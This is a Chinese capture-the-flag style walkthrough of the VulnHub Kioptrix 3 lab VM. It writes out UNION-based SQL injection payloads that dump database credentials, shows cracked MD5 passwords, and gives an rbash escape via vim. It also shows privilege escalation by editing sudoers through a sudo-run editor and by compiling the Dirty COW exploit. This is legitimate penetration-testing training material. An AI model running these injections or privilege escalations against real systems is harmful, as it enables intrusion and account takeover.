# 前言

靶机：`kioptrix-3`，IP地址为`192.168.1.74`

攻击：`kali`，IP地址为`192.168.1.16`

都采用虚拟机，网卡为桥接模式

> 文章中涉及的靶机，来源于`vulnhub`官网，想要下载，可自行访问官网下载，或者通过下方链接下载

在这里解压靶机后，会有一个`readme.txt`文件，查看该文件，提示是需要进行`ip`和域名的绑定

在`kali`中修改`/etc/hosts`文件即可，在`windows`中修改`C:\Windows\System32\Drivers\etc\hosts`文件即可

这里是修改`windows`文件，因为前面都是修改的`kali`文件，不能把`windows`也忘了

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\0.jpg)

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`扫描

也可以使用`nmap`等工具进行

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\1.jpg)

# 信息收集

## 使用nmap扫描端口

```shell
nmap -sV -O 192.168.1.74 -p- -T4
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\2.jpg)

## 网站信息探测

访问80端口界面，发现三个功能点，`home`指向`index.php?page=`，`blog`和`login`指向`index.php?system=`

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\3.jpg)

查看页面源代码后，发现脚本语言为`php`，并且是目录型网站，且发现几个地址链接

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\4.jpg)

访问`blog`，这就是一个博客

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\5.jpg)

访问`login`，发现是登录界面，尝试之前的万能密码进行测试，发现是不行的，不过这里还是可以看到产品的出处，也就是`cms`为`lotusCMS`

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\6.jpg)

那么暂且搁置，还有一个目录没有访问查看呢

访问`gallery`，这个界面的内容挺多

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\7.jpg)

尝试进行测试吧，发现点击`ligoat press room`时，其中的功能多了很多，并且出现`php`传参`id`，这个可以进行模糊测试，先以最简单的测试，看有无注入点

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\8.jpg)

# sql注入获取账户密码

尝试以`sql`注入的判断，以`'`进行闭合，发现出现报错，那么可能存在`sql`注入，并且数据库类型为`mysql`

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\9.jpg)

进一步测试，确定为数字型的注入

```html
?id=1 or 1=1--+
?id=1 and 1=1--+
?id=1 and 1=2--+
```

尝试构造语句，先测试联合查询是否可行，毕竟这个是比较省事的。

首先确定显示列数，可以借助`order by`

```html
?id=1 order by 6
```

这里的数字6是经过回显不同确定的

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\10.jpg)

确定列数为6，那么就构造联合查询

```html
?id=-1 union select 1,2,3,4,5,6 --+

//对于靶机来说，数字1-6代表是可以，不过大部分时候，就算真的存在sql注入，也是并非这样
//而是需要对应类型，所以大部分时候，也是以null进行代表，然后猜测每一个类型是字符还是数字
?id=-1 union select 1,null,null,null,null,null --+
```

可以看到，在`2,3`位是有回显的

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\11.jpg)

尝试构造语句，来获取当前数据库名称，数据库用户，数据库版本信息

```shell
?id=-1 union select 1,concat(database(),'|',version(),'|',user()),3,4,5,6 --+
```

获取到信息，数据库`gallery`，数据库版本是`5.0`之后，具有`information_schema`这个表,并且确定`concat`是可用的

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\12.jpg)

那么尝试从`information_schema`中查询`gallery`中的一些数据，因为一般可能当前使用的数据库中有信息，当然肯定还是其他数据库也是有信息的，不过这里先测试这个

```
?id=-1 union select 1,concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--+
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\13.jpg)

发现这个表，那么就测试这个表中的元组

```
?id=-1 union select 1,concat(column_name),3,4,5,6 from information_schema.columns where table_name='gallarific_users'--+
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\14.jpg)

这两个就很是吸引人了，直接就尝试获取

```shell
?id=-1 union select 1,concat(username,'|',password),3,4,5,6 from gallarific_users--+
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\15.jpg)

用户名`admin`和密码`n0t7t1k4`

结合前面`login`目录，推测应该可以登录，访问`login`，并进行测试，不过并非，那么可能漏了数据，返回继续收集

在前面某处有一个表名是`dev_accounts`，不过当时没关注，其中`accounts`是账户的意思，结合`dev`，推测是靶机内的账户

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\16.jpg)



```shell
?id=-1 union select 1,concat(column_name),3,4,5,6 from information_schema.columns where table_name='dev_accounts'--+
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\17.jpg)


```shell
?id=-1 union select 1,concat(username,'|',password),3,4,5,6 from dev_accounts--+
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\18.jpg)

| 用户名     | 密码(md5加密)                    | 解密密码 |
| ---------- | -------------------------------- | -------- |
| dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | Mast3r   |
| loneferret | 5badcaf789d3d1d09794d8f021f40f0e | starwars |

可以发现这里的密码应该是进行加密，并且挺像`md5`加密的，假设就是，尝试进行破解即可，可借助`john`爆破，或者使用在线网站识别

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\19.jpg)

# rbash逃逸

那么直接测试是否可连接`ssh`，发现可以登录

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\20.jpg)

尝试`cd`，发现具有`rbash`，没办法有更完整的功能

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\21.jpg)

输入`help`，发现有`compgen`命令可用

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\22.jpg)

常见的`rbash`逃逸方法有很多，这里通过`compgen`测试有无`vim`

```shell
compgen -c | grep vim
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\23.jpg)

那么随便`vim`编辑一个文件，然后尝试进行`rbash`逃逸

```shell
vim 1

按着esc，然后输入 :
:set shell=/bin/bash
:shell
```

即可逃逸成功

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\24.jpg)

还有其他方式，如最简单的，若是可以使用`bash`，则可以直接逃逸

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\25.jpg)

可自行`ai`搜索，或者参考一些博主的文章

# 提权

## 借助sudo提权

使用`find`寻找具有SUID权限的文件，发现`sudo`，尝试列出有无文件可用，但是发现当前用户不行

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\26.jpg)

那么切换到用户`loneferret`，直接通过`su`切换即可，既然是新用户，查看当前目录下的一些文件，发现都指向`ht`

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\27.jpg)

测试`sudo -l`，发现虽然有一个文件，说是对于除`su`以外的都可以执行，但是测试后，根本不行

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\28.jpg)

那么还是从`ht`下手，直接`sudo`，发现报错

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\29.jpg)

可以自行`ai`搜索是什么意思，这里可以设置临时变量

```shell
export TERM=xterm
sudo /usr/local/bin/ht
```

或者

```shell
sudo TERM=xterm ht
```

这就是打开后的界面

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\30.jpg)

这里的操作方式，可以通过`alt+f`打开左上角的`file`菜单，其余的同样，都是`alt`+红色开头字母，可与打开对应的菜单，按`esc`退出菜单

这里因为这个`ht`是通过`sudo`打开的，所以可以通过这个打开一些无法打开的文件，如`/etc/shadow`

打开`file`菜单后，选择`open`，然后按着`tab`键盘，这时候就会切换到`files`，这里可以切换目录

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\31.jpg)

这里就可以尝试使用`john`进行爆破，不过这里肯定耗时间，毕竟还不知道加密方式

并且，这里还是可以修改的，所以还可以修改`sudoers`文件

打开后，添加一行，因为涉及到修改，所以需要保存，在`alt+f`后，有`save`按钮，然后按`f10`即可退出

```shell
loneferret ALL=(ALL) NOPASSWD:ALL
#对于loneferret用户，可以通过sudo执行所有，并且不需要输入密码
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\32.jpg)

再次`sudo -l`查看，可以发现修改成功，这时候就可以使用`sudo`为所欲为了

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\33.jpg)

这里还可以在`kali`生成公私钥，然后去`/root`目录下，在`.ssh`目录下，添加一个文件，然后把生成的公钥复制到新文件`authorized_keys`即可，这里是确认在`/root`下有`.ssh`目录的

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\34.jpg)



## 通过系统内核提权

在靶机测试内核版本等信息

```shell
uname -a
uname -r 
cat /etc/*release
cat /etc/issue
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\35.jpg)

这个内核范围是在脏牛提权的范围内的，只是对于使用哪一个有待测试

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\36.jpg)

测试过后，发现对于`40839.c`是可以的，当然这里还可以借助脚本工具`les.sh`或者叫`linux-exploit-suggester.sh`

这里在`github`的地址如下：

```
https://github.com/The-Z-Labs/linux-exploit-suggester
```

这是在`kali`中指定靶机的`uname -a`信息分析出最有可能的提权漏洞，也就是脏牛，并且这里还缩小范围了

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\37.jpg)

提权过程就是把`40839.c`文件下载到靶机内的/`tmp`目录，然后进行编译，可以查看该文件，其中是有用法的

```shell
gcc -pthread 40839.c -o dirty -lcrypt
./dirty my-new-password
su firefart
```

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\38.jpg)

编译后执行，然后切换到用户`firefart`，密码就是自己设置的，即可提权

![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-3\39.jpg)





# 总结



该靶机考察以下几点：

1. 网站功能测试，能点的都点了进行测试，最好是抓包分析，这里可通过浏览器抓包或者`burp`抓包都行，这里的靶机肉眼可见，就无需抓包
2. 对于注入点能否找到并且测试，现在其实都放置在一个字典中，然后进行模糊测试某一个传参等方式
3. 基本的`sql`注入要会，这里虽然我只用了联合查询，但是其他方式难道不行吗，比如延时注入、布尔注入
4. 对于`mysql`数据库的基本构造要知道，这里是`information_schema`数据库的重点，当然其他数据库也要去了解
5. 对于`rbash`逃逸，方法众多，不要局限，这里最终无法逃逸，还是可以切换用户的，这个主要就是练习
6. 对于提权方法，这里是通过命令历史查看或者`sudo -l`都是可以发现第三方软件，并且初步测试该软件的功能，要快速知道该软件有无可利用点
7. 提权方式，内核版本也是重要的，这里脏牛提权



>  这里其实前面有很多步骤都没有写，因为我是测试过，当时觉得并无内容，不重要，但是还是在这里写一下吧，毕竟要养成一个习惯

1. 目录扫描爆破，这里其实发现了`phpmyadmin`界面，可以在这里进行爆破测试。主要就是不要忘记目录爆破，这个可能会取得意想不到的内容

2. CMS漏洞，这里不要忘记搜索并测试，这种很重要，不过这里我是搜索并测试无用后，所以就没有记录。但是一定要知道这个重要的方式

   



































